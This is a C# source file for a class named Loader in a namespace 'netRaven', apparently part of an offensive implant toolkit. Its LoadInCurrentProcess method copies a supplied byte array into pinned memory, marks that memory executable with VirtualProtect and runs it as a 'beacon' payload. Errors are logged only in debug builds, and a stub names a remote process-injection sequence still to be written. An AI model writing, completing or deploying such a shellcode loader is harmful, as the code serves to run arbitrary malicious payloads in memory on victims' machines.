using System;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Security;

namespace netRaven
{
    public class Loader
    {
        public Loader(byte[] payload, int processId = 0)
        {
            _bytes = payload;
            _pid = processId;
        }

        public void LoadInCurrentProcess()
        {
            try
            {
                // Load and Execute beacon
                GCHandle pinnedArray = GCHandle.Alloc(_bytes, GCHandleType.Pinned);
                IntPtr funcAddr = pinnedArray.AddrOfPinnedObject();
                Marshal.Copy(_bytes, 0, funcAddr, _bytes.Length);
                uint flOldProtect;
                VirtualProtect(funcAddr, (UIntPtr)_bytes.Length, 0x40, out flOldProtect);
                runD del = (runD)Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(runD));
                del();

                return;
            }
            catch (Exception e)
            {
#if DEBUG
                Console.WriteLine("Error loading beacon " + e.ToString());
#endif
                return;
            }
        }

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
        public delegate Int32 runD();

        public void LoadInRemoteProcess()
        {
            // TODO: Load in remote process via OpenProcess, VirtualAlloc, WriteProcess, NtCreateThread/CreateThread
        }

        private static byte[] _bytes;
        private static int _pid;
    }
}
